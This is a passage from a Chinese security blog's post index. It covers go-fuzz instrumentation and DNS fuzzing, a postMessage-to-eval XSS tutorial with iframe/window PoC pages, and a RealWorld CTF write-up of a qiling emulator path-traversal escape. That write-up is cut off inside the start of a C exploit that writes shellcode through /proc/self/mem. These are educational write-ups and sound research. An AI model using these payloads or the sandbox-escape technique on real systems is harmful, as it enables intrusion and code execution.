一个是ast.IncDecStmt节点，这个是newCounter()函数的返回值 如果body不为空就找到所有影响控制流的声明，比如if，switch, break ,goto等都会开启或者中断一个新的控制流，找到边界声明之后判断其是否属于刚才的类型： func (f *File) endsBasicSourceBlock(s ast.Stmt) bool { switch s := s.(type) { case *ast.BlockStmt: // Treat blocks like basic blocks to avoid overlapping counters. return true case *ast.BranchStmt: return true case *ast.ForStmt: return true case *ast.IfStmt: return true case *ast.LabeledStmt: return f.endsBasicSourceBlock(s.Stmt) case *ast.RangeStmt: return true case *ast.SwitchStmt: return true case *ast.SelectStmt: return true case *ast.TypeSwitchStmt: return true case *ast.ExprStmt: // Calls to panic change the flow. // We really should verify that \"panic\" is the predefined function, // but without type checking we can't and the likelihood of it being // an actual problem is vanishingly small. if call, ok := s.X.(*ast.CallExpr); ok { if ident, ok := call.Fun.(*ast.Ident); ok &amp;&amp; ident.Name == \"panic\" &amp;&amp; len(call.Args) == 1 { return true } } } found, _ := hasFuncLiteral(s) return found } 其实就是大量的switch语句，如果是的话，就可以将直接边界作为end进行插桩，这一步的意义其实就是在于把{}里面的body不断的分割成一个个可以影响控制流的小块进行分别插桩。其实到这里我们就可以洞悉go-fuzz整个的插桩思想：在语法分析的时候就通过go-fuzz本身所包含的一个包的内容插桩到各个可以影响控制流的语句块中，那么接下来对应的工作就应该是如何对这些进行插桩语句块进行感知，这其实就是Sonar结构体的作用，这是go-fuzz发明的声呐系统。 Sonar遍历​ Sonar结构体同样实现了Visit方法来用于遍历语法树，部分源码如下： func (s *Sonar) Visit(n ast.Node) ast.Visitor { switch nn := n.(type) { case *ast.BinaryExpr: break ...... case *ast.SwitchStmt: if nn.Tag == nil || nn.Body == nil { return s // recurse } // Replace: // switch a := foo(); bar(a) { // case x: ... // case y: ... // } // with: // switch { // default: // a := foo() // __tmp := bar(a) // switch { // case __tmp == x: ... // case __tmp == y: ... // } // } // The == comparisons will be instrumented later when we recurse. sw := new(ast.SwitchStmt) *sw = *nn var stmts []ast.Stmt if sw.Init != nil { stmts = append(stmts, sw.Init) sw.Init = nil } const tmpvar = \"__go_fuzz_tmp\" tmp := ast.NewIdent(tmpvar) typ := s.info.Types[sw.Tag] s.info.Types[tmp] = typ stmts = append(stmts, &amp;ast.AssignStmt{Lhs: []ast.Expr{tmp}, Tok: token.DEFINE, Rhs: []ast.Expr{sw.Tag}}) stmts = append(stmts, &amp;ast.AssignStmt{Lhs: []ast.Expr{ast.NewIdent(\"_\")}, Tok: token.ASSIGN, Rhs: []ast.Expr{tmp}}) sw.Tag = nil stmts = append(stmts, sw) for _, cas1 := range sw.Body.List { cas := cas1.(*ast.CaseClause) for i, expr := range cas.List { tmp := &amp;ast.Ident{Name: tmpvar, NamePos: expr.Pos()} s.info.Types[tmp] = typ cas.List[i] = &amp;ast.BinaryExpr{X: tmp, Op: token.EQL, Y: expr} } } nn.Tag = nil nn.Init = nil nn.Body = &amp;ast.BlockStmt{List: []ast.Stmt{&amp;ast.CaseClause{Body: stmts}}} return s // recurse ...... } 第一步先根据节点类型找到Switch和For这种结构进行语法树级别的变化，整体的替换逻辑已经在注释里面体现出来了，其实就是类似把switch的条件都提出来放在body内部，然后再body里面建立一个新的switch结构，主要作用可能就是方便识别和统计，对于ast.BinaryExpr结构则是通过自定义的flag进行标注。 ​ 整体来看其实就是对包内代码各种语法树节点进行类型检查和过滤，因为一些代码是肯定顺序执行的，然后再需要的地方都插入一些标志，同时在结构体里面记录标志的总量，方便在fuzz执行的时候确定自己的代码位置从而更方便进行统计，具体的可以细看相关代码。 插桩总结​ 其实无论是File还是Sonar，个人认为都算是一种插桩，方便对代码覆盖率进行统计，在结束之后都通过createFuzzMain函数进行了封装，这个地方其实也是go-fuzz不支持fuzz的代码包含main函数的具体原因： func (c *Context) createFuzzMain() string { mainPkg := filepath.Join(c.fuzzpkg.PkgPath, \"go.fuzz.main\") path := filepath.Join(c.workdir, \"gopath\", \"src\", mainPkg) c.mkdirAll(path) c.writeFile(filepath.Join(path, \"main.go\"), c.funcMain()) return mainPkg } 其实就是将已经写好的main函数模板写入： var ainSrc = template.Must(template.New(\"main\").Parse(` package main import ( target \"{{.Pkg}}\" dep \"go-fuzz-dep\" ) func main() { fns := []func([]byte)int { {{range .AllFuncs}} target.{{.}}, {{end}} } dep.Main(fns) } `)) 主要作用还是调用包内的Fuzz代码。 go-fuzz 首先通过丢弃触发相同代码路径的的样本来最小化语料库。 开始改变输入并将数据传递给Fuzz函数，不失败（return 1），然后扩展代码覆盖率的突变会被保留和迭代形成新的样本。 当程序出现Crash的时候，会保存报告并重新启动程序。 Fuzz这块的具体原理其实都是参考的AFL，就不多说了，详细也可以参考AFL的Fuzz方式和源码。 测试用例​ 首先简单介绍一下go的Fuzz函数的基本信息： func Fuzz(data []byte) int { } 该函数以int作为返回值，因此当其返回值为0的时候说明Fuzz对于数据不敢影响，可能的原因是测试目标发生了无意义的错误，比如输入内容不合法等，返回值为1说明该数据已经被成功解析，简单来说就是Fuzz输入的data被目标所接受。 DNS解析器Fuzz首先第一步是创建初始语料库，其实就是通过拆解pcap数据包来创造数据： package main import ( \"crypto/rand\" \"encoding/hex\" \"log\" \"os\" \"strconv\" \"github.com/miekg/pcap\" ) func fatalIfErr(err error) { if err != nil { log.Fatal(err) } } func main() { handle, err := pcap.OpenOffline(os.Args[1]) fatalIfErr(err) b := make([]byte, 4) _, err = rand.Read(b) fatalIfErr(err) prefix := hex.EncodeToString(b) i := 0 for pkt := handle.Next(); pkt != nil; pkt = handle.Next() { pkt.Decode() f, err := os.Create(\"p_\" + prefix + \"_\" + strconv.Itoa(i)) fatalIfErr(err) _, err = f.Write(pkt.Payload) fatalIfErr(err) fatalIfErr(f.Close()) i++ } } 编写初步的Fuzz函数： func Fuzz(rawMsg []byte) int { msg := &amp;dns.Msg{} if unpackErr := msg.Unpack(rawMsg); unpackErr != nil { return 0 } if _, packErr = msg.Pack(); packErr != nil { println(\"failed to pack back a message\") spew.Dump(msg) panic(packErr) } return 1 } 作者在发现了越界： func unpackTxt(msg []byte, offset, rdend int) ([]string, int, error) { var err error var ss []string var s string for offset &lt; rdend &amp;&amp; err == nil { s, offset, err = unpackTxtString(msg, offset) if err == nil { ss = append(ss, s) } } return ss, offset, err } 但是因为这些越界使得程序经常崩溃，并且Fuzz变的缓慢，于是作者先进行了阶段性的修复工作，主要修复是使用len(msg)而不是使用保留的偏移量： func unpackTxt(msg []byte, off0 int) (ss []string, off int, err error) { off = off0 var s string for off &lt; len(msg) &amp;&amp; err == nil { s, off, err = unpackTxtString(msg, off) if err == nil { ss = append(ss, s) } } return } 之后修改好的Fuzz，主要的修改在于增加了ParseDNSPacketSafely，并抛弃了一些无意义的错误，也可能不断测试，不断排除已知的错误: func Fuzz(rawMsg []byte) int { var ( msg, msgOld = &amp;dns.Msg{}, &amp;old.Msg{} buf, bufOld = make([]byte, 100000), make([]byte, 100000) res, resOld []byte unpackErr, unpackErrOld error packErr, packErrOld error ) unpackErr = msg.Unpack(rawMsg) unpackErrOld = ParseDNSPacketSafely(rawMsg, msgOld) if unpackErr != nil &amp;&amp; unpackErrOld != nil { return 0 } if unpackErr != nil &amp;&amp; unpackErr.Error() == \"dns: out of order NSEC block\" { // 97b0a31 - rewrite NSEC bitmap [un]packing to account for out-of-order return 0 } if unpackErr != nil &amp;&amp; unpackErr.Error() == \"dns: bad rdlength\" { // 3157620 - unpackStructValue: drop rdlen, reslice msg instead return 0 } if unpackErr != nil &amp;&amp; unpackErr.Error() == \"dns: bad address family\" { // f37c7ea - Reject a bad EDNS0_SUBNET family on unpack (not only on pack) return 0 } if unpackErr != nil &amp;&amp; unpackErr.Error() == \"dns: bad netmask\" { // 6d5de0a - EDNS0_SUBNET: refactor netmask handling return 0 } if unpackErr != nil &amp;&amp; unpackErrOld == nil { println(\"new code fails to unpack valid packets\") panic(unpackErr) } res, packErr = msg.PackBuffer(buf) if packErr != nil { println(\"failed to pack back a message\") spew.Dump(msg) panic(packErr) } if unpackErrOld == nil { resOld, packErrOld = msgOld.PackBuffer(bufOld) if packErrOld == nil &amp;&amp; !bytes.Equal(res, resOld) { println(\"new code changed behavior of valid packets:\") println() println(hex.Dump(res)) println(hex.Dump(resOld)) os.Exit(1) } } return 1 } Tips： ​ 其实在Fuzz过程中也会遇到一些结构化的问题，毕竟大型项目都会存在大量的复杂结构体难以变异，这时候才为大家提供一个神器go-fuzz-header： https://adalogics.com/blog/structure-aware-go-fuzzing-complex-types 云原生下的Fuzz思考​ 云原生的很多新技术其实都是在老技术的交叉上形成的，其实可以类似go项目结构里面的不同的包，对于很多Fuzz目标来言，像以前那样直接从最根本处下手已经不太现实可行，比如容器Fuzz其实很难通过生成大量镜像或者docker client的命令来解决，恰恰相反深入程序内部针对不同函数来编写Fuzz或许更有价值。 ​ 但是缺点也很明显，首先必须和代码审计相结合，其次就是由于代码是否用户可达或者crash是否真的引发漏洞效果都有待评估，正如go-fuzz创始人所说：“go-fuzz其实更适合开发者来寻求自己项目中存在的bug”，但是漏洞挖掘技术也是在不断的进步之中，或许可以思考如何把找到的bug发展成漏洞，毕竟对于内存安全的高级语言来说直接谋求可利用漏洞相对困难。 ​ 其实在内存漏洞越来越少的现在，这种bug最终演变成漏洞的例子还是有的，就比如linux pkexec提权漏洞，过去几年大家都认为这是一个bug，但是等利用方式被真正发掘，就能变化成为严重的安全问题。 参考资料 https://github.com/dvyukov/go-fuzz","categories":[{"name":"Clock","slug":"Clock","permalink":"https://rainsec.cn/categories/Clock/"},{"name":"Golang","slug":"Clock/Golang","permalink":"https://rainsec.cn/categories/Clock/Golang/"}],"tags":[{"name":"Fuzz","slug":"Fuzz","permalink":"https://rainsec.cn/tags/Fuzz/"}],"author":"Clock"},{"title":"EventListener XSS","slug":"EventListener XSS","date":"2022-03-25T10:38:45.000Z","updated":"2022-07-20T08:20:53.683Z","comments":true,"path":"/post/EventListener XSS.html","link":"","permalink":"https://rainsec.cn/post/EventListener%20XSS.html","excerpt":"","text":"EventListener XSSXSS作为混”低保“的最佳漏洞，我们在日常测试中没少碰到，但是DOM型XSS就相对来说不容易被发现了，而本文要介绍的则是更难发现并利用的监听postMessage所导致漏洞。首先从事件监听器开始说起 事件监听器事件监控器可以为指定对象设置一个回调函数，当该对象的指定事件被触发时会被执行： &lt;table id=\"outside\"&gt; &lt;tr&gt;&lt;td id=\"t1\"&gt;one&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td id=\"t2\"&gt;two&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;script&gt; function modifyText() { var t2 = document.getElementById(\"t2\"); if (t2.firstChild.nodeValue == \"three\") { t2.firstChild.nodeValue = \"two\"; } else { t2.firstChild.nodeValue = \"three\"; } } // 为table添加事件监听器 var el = document.getElementById(\"outside\"); el.addEventListener(\"click\", modifyText, false); &lt;/script&gt; 以上代码监听了table的click事件，当点击table时会触发modifyText,下面链接列出了所有的事件: https://developer.mozilla.org/en-US/docs/Web/Events#event_index 这里要说的是postMessage与其对应的事件监听器在不安全配置情况下导致的漏洞，首先看下postMessage的介绍： &gt; window.postMessage() 方法可以安全地实现跨源通信。通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机 (两个页面的模数 Document.domain设置为相同的值) 时，这两个脚本才能相互通信。window.postMessage() 方法提供了一种受控机制来规避此限制，只要正确的使用，这种方法就很安全。 https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage 它的用法也很简单： windows.postMessage(message, targetOrigin, [transfer]) windows是指一个窗口，可以是当前页面的window、window.open返回的窗口对象、iframe的contentWindow属性等 message是要发送的消息，可以是字符串，也可以是json格式 targetOrigin用来指定哪个窗口可以接收到消息，如果为*则表示任意窗口均可收到信息。而如果指定了特定的域名后要求发送消息的窗口其协议、端口、主机地址与指定域名匹配才可发送消息。 发送消息事件可以通过如下方式添加监听事件： window.addEventListener(\"message\", receiveMessage, false); function receiveMessage(event) { } 当发送信息时就会触发receiveMessage。其中event的属性比较重要的有： data 即postMessage发送的数据 origin 发送信息窗口的origin 漏洞触发比起原理，大家肯定对漏洞如何利用更感兴趣。看下面这段代码 &lt;html&gt; &lt;head&gt;&lt;title&gt;Toxic DOM&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;script&gt; var postMessageHandler = function(msg) { var content = msg.data; var msgObj = eval(content); if (msgObj.isActive) { document.write(\"PostMessage arrived!\"); } } window.addEventListener('message', postMessageHandler, false); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; &lt;!-- https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval --&gt; 很明显可以看出这个页面在监听到postMessage时会调用eval执行发送的信息，那我们就可以构造payload了 &lt;script&gt; function pocLink() { let win = window.open('https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval'); let msg = \"alert(1);\"; setTimeout(function(){ win.postMessage(msg, '*'); }, 5000); } &lt;/script&gt; &lt;a href=\"#\" onclick=\"pocLink();\"&gt;PoC link&lt;/a&gt; 或者是使用iframe &lt;script&gt; function pocFrame(win) { let msg = \"alert(1);\"; win.postMessage(msg, '*'); } &lt;/script&gt; &lt;iframe src=\"https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval\" onload=\"pocFrame(this.contentWindow)\"&gt;&lt;/iframe&gt; 也就是说我们需要在自己服务器上新建一个页面，用来打开一个新窗口或是加载一个iframe并获取其句柄，用来传递信息。当打开的窗口中存在有message监听，且其触发代码有可利用点时就可以触发漏洞。 工具检测纯手工发现漏洞不可取，Burp的DOM Invader就可以帮助发现此类问题 对于https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval 它可以直接检测出漏洞存在并一键生成POC 为了了解原理最好可以看看它的代码，但是其源码做了混淆，没办法了解它的原理，所以我们从它的平替postMessage-tracker入手进行分析。 其检测结果展示形式为 平平无奇的一个小框框，相较于DOM Invader的可利用性分析差了许多，不过仅仅了解下原理已然足够了。 它的目录结构非常简单，首先看下mainfest.json run_at表明注入在css之后，dom构建之前。关键代码在content_script.js当中： 这一段的主要作用就是在添加监听器前判断其类型是否时message，如果是则记录下来一些数据，比如此时的堆栈信息等。合理推测Burp在此之上加入了危险函数判断的操作，后续有空的话就给DOM Invader加一个类似的功能练练手吧，日常使用当然还是Burp的香啊~ 参考文章 https://github.com/fransr/postMessage-tracker https://portswigger.net/burp/documentation/desktop/tools/dom-invader","categories":[{"name":"Noel","slug":"Noel","permalink":"https://rainsec.cn/categories/Noel/"},{"name":"Web","slug":"Noel/Web","permalink":"https://rainsec.cn/categories/Noel/Web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://rainsec.cn/tags/XSS/"}],"author":"Noel"},{"title":"RealWorld CTF之qiling框架分析","slug":"Qilin框架分析","date":"2022-01-28T10:48:45.000Z","updated":"2022-07-20T08:20:38.039Z","comments":true,"path":"/post/Qilin框架分析.html","link":"","permalink":"https://rainsec.cn/post/Qilin%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90.html","excerpt":"","text":"RealWorld CTF之qiling框架分析qiling​当时题目就给了一个qiling的使用的用例，甚至和官方文档上面的用例差不多因此肯定是库的问题。 #!/usr/bin/env python3 import os import sys import base64 import tempfile # pip install qiling==1.4.1 from qiling import Qiling def my_sandbox(path, rootfs): ql = Qiling([path], rootfs) ql.run() def main(): sys.stdout.write('Your Binary(base64):\\n') line = sys.stdin.readline() binary = base64.b64decode(line.strip()) with tempfile.TemporaryDirectory() as tmp_dir: fp = os.path.join(tmp_dir, 'bin') with open(fp, 'wb') as f: f.write(binary) my_sandbox(fp, tmp_dir) if __name__ == '__main__': main() 大致分析qiling源代码发现其加载模拟文件的流程如下（可以看qiling项目core.py文件，其中实现了一个Qiling的类）： 在实例初始化阶段设置一系列基础信息比如当前平台的操作系统及其架构等。 设置运行参数 设置需要的roofs目录，这里也是出问题的一个关键点 设置操作系统和结构 设置大小端序和机器长度 初始化QlCoreStructs结构体，主要是用来pack的 加载loader，主要就是根据os type导入loader文件夹下的不同文件。 log日志操作 加载qiling自己实现的内存管理器和寄存器管理器（这个根据interpreter成员来决定是否加载） 根据不同arch架构来加载qiling自己的实现的arch，就在目录的arch下 根据interpreter成员来决定是否初始化QlCoreHooks 启动之前加载loader，加载目标（linux的话里面其实实现了ELF的解析以及加载到内存的整个过程，甚至如果提供了interpreter也可以进行加载，详情可以看loader文件夹下的elf.py），然后起了一个守护页，看注释应该是保护内存的，至此初始化工作完成。 根据interpreter成员来决定是否选择不同的执行模式，一般直接初始化osHook通过os运行目标文件 上面是大致的加载过程，下面分析一下文件是怎么运行起来的（以模拟linux操作系统为例），运行的方式大致是分为运行qiling独立实现的解释器和不使用qiling独立实现的解释器两种，（作者大佬说是区块链智能合约解释器，这块我不是很懂，好像是智能合约bytecode执行，这里主要说os run） 在QlOsLinux类里面找到相应的run函数： def run(self): if self.ql.exit_point is not None: self.exit_point = self.ql.exit_point try: if self.ql.code: self.ql.emu_start(self.entry_point, (self.entry_point + len(self.ql.code)), self.ql.timeout, self.ql.count) else: if self.ql.multithread == True: # start multithreading thread_management = thread.QlLinuxThreadManagement(self.ql) self.ql.os.thread_management = thread_management thread_management.run() else: if self.ql.entry_point is not None: self.ql.loader.elf_entry = self.ql.entry_point elif self.ql.loader.elf_entry != self.ql.loader.entry_point: entry_address = self.ql.loader.elf_entry if self.ql.archtype == QL_ARCH.ARM and entry_address &amp; 1 == 1: entry_address -= 1 self.ql.emu_start(self.ql.loader.entry_point, entry_address, self.ql.timeout) self.ql.enable_lib_patch() self.run_function_after_load() self.ql.loader.skip_exit_check = False self.ql.write_exit_trap() self.ql.emu_start(self.ql.loader.elf_entry, self.exit_point, self.ql.timeout, self.ql.count) 看了看emu_start，主要是利用unicorn进行模拟执行的。然后看了看linux OS的初始化，总结下来觉得qiling实现的东西还是很多的，比如自己的os loader，arch，syscall，hook等，以x86_64架构下的linux为例子看其是如何加载自己的syscall的。 # X8664 elif self.ql.archtype == QL_ARCH.X8664: self.gdtm = GDTManager(self.ql) ql_x86_register_cs(self) ql_x86_register_ds_ss_es(self) self.ql.hook_insn(self.hook_syscall, UC_X86_INS_SYSCALL) # Keep test for _cc #self.ql.hook_insn(hook_posix_api, UC_X86_INS_SYSCALL) self.thread_class = thread.QlLinuxX8664Thread def hook_syscall(self, ql, intno = None): return self.load_syscall() load_syscall本身比较复杂，通过代码可以看出它都实现了那些syscall，这里的大部门都是直接使用的系统底层的一些syscall，并不是麒麟自己实现的，可以看他的load_syscall函数实现，不过在posix文件夹下的syscall文件夹里面发现其实qiling自己也实现了大量的syscall，这俩种syscall在使用时的区别主要在于要模拟的文件源码中是直接使用的syscall还是类似open的这种函数形式，前者会调用qiling自身实现的，后者则会直接调用对应的系统调用（这块基于推理和调试，不过大致qiling的系统调用就是通过hook进行检测然后通过回调调用对应的代码这样子），调用回溯如下： 其实从上面就可以看出，qiling本身实现的功能还是很多的，比如内存管理，动态模拟不同架构等，但是根据从大佬哪里偷来的经验，首先像python这种高级语言，内存出现问题是很不常见的，大多都是逻辑问题，那么就很可能是实现跟底层系统进行交互的设计出现问题，比如实现的syscall，这也是rwctf的考点。 漏洞分析​以qiling实现的ql_syscall_open为例子： def ql_syscall_open(ql: Qiling, filename: int, flags: int, mode: int): path = ql.os.utils.read_cstring(filename) real_path = ql.os.path.transform_to_real_path(path) relative_path = ql.os.path.transform_to_relative_path(path) flags &amp;= 0xffffffff mode &amp;= 0xffffffff idx = next((i for i in range(NR_OPEN) if ql.os.fd[i] == 0), -1) if idx == -1: regreturn = -EMFILE else: try: if ql.archtype== QL_ARCH.ARM and ql.ostype!= QL_OS.QNX: mode = 0 #flags = ql_open_flag_mapping(ql, flags) flags = ql_open_flag_mapping(ql, flags) ql.os.fd[idx] = ql.os.fs_mapper.open_ql_file(path, flags, mode) regreturn = idx except QlSyscallError as e: regreturn = - e.errno ql.log.debug(\"open(%s, 0o%o) = %d\" % (relative_path, mode, regreturn)) if regreturn &gt;= 0 and regreturn != 2: ql.log.debug(f'File found: {real_path:s}') else: ql.log.debug(f'File not found {real_path:s}') return regreturn 首先通过绝对路径获取模拟执行文件在rootfs下的相对路径，然后将flags传递给ql_open_flag_mapping，然后进行open操作，将得到的fd通过idx索引进行一个存储。 其大致的函数调用链如下： ql_syscall_open –&gt; open_ql_file —&gt; os.open def open_ql_file(self, path, openflags, openmode, dir_fd=None): if self.has_mapping(path): self.ql.log.info(f\"mapping {path}\") return self._open_mapping_ql_file(path, openflags, openmode) else: if dir_fd: return ql_file.open(path, openflags, openmode, dir_fd=dir_fd) real_path = self.ql.os.path.transform_to_real_path(path) return ql_file.open(real_path, openflags, openmode) 在open_ql_file这里发现可能存在漏洞，函数首先判断文件是否已经打开过了，然后判断是否存在dir_fd，如果不存在的话会调用transform_to_real_path函数，该函数也是实现模拟器文件系统隔离的一个关键，这里面对符号链接文件进行了多重解析，但是好像没对路径进行判断，应该也会出现链接的目标问题，它返回一个文件在系统上面的真实路径，然后由open打开相关文件。 def transform_to_real_path(self, path: str) -&gt; str: real_path = self.convert_path(self.ql.rootfs, self.cwd, path) ....... return str(real_path.absolute()) 但是真正的隔离其实是convert_path实现的： @staticmethod def convert_for_native_os(rootfs: Union[str, Path], cwd: str, path: str) -&gt; Path: _rootfs = Path(rootfs) _cwd = PurePosixPath(cwd[1:]) _path = Path(path) if _path.is_absolute(): return _rootfs / QlPathManager.normalize(_path) else: return _rootfs / QlPathManager.normalize(_cwd / _path.as_posix()) def convert_path(self, rootfs: Union[str, Path], cwd: str, path: str) -&gt; Path: emulated_os = self.ql.ostype hosting_os = self.ql.platform_os # emulated os and hosting platform are of the same type if (emulated_os == hosting_os) or (emulated_os in QL_OS_POSIX and hosting_os in QL_OS_POSIX): return QlPathManager.convert_for_native_os(rootfs, cwd, path) elif emulated_os in QL_OS_POSIX and hosting_os == QL_OS.WINDOWS: return QlPathManager.convert_posix_to_win32(rootfs, cwd, path) elif emulated_os == QL_OS.WINDOWS and hosting_os in QL_OS_POSIX: return QlPathManager.convert_win32_to_posix(rootfs, cwd, path) else: return QlPathManager.convert_for_native_os(rootfs, cwd, path) 这里建立了rootfs，第一步肯定是想到的路径穿越，比如../../../../这种，但是实验发现../../../test也会被拼接成rootfs/test，原因在于convert_for_native_os函数中利用了normalize进行了处理，导致无法进行路径穿越： def normalize(path: Union[Path, PurePath]) -&gt; Union[Path, PurePath]: # expected types: PosixPath, PurePosixPath, WindowsPath, PureWindowsPath assert isinstance(path, (Path, PurePath)), f'did not expect {type(path).__name__!r} here' normalized_path = type(path)() # remove anchor (necessary for Windows UNC paths) and convert to relative path if path.is_absolute(): path = path.relative_to(path.anchor) for p in path.parts: if p == '.': continue if p == '..': normalized_path = normalized_path.parent continue normalized_path /= p return normalized_path 符号链接就可以绕过检查，但是遗憾的是qiling没有实现symlink的系统调用，不过，回看open_ql_file的代码可以看出，如果dir_fd存在，那么就可以绕过这些检查，这时候自然就可以想到ql_syscall_openat的实现，这个就很简单，里面也没什么严格的检查，因此就可以实现目录穿越。 漏洞利用​ 在实现了目录穿越之后其实问题就变得简单了，我们可以通过/proc/self/maps获取到自身进程的内存信息，然后通过/proc/self/mem实现恶意代码执行，进而完成逃逸，这里展示一个小demo。 #include&lt;stdio.h&gt; #include&lt;fcntl.h&gt; #include&lt;string.h&gt; unsigned char nop[] = \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90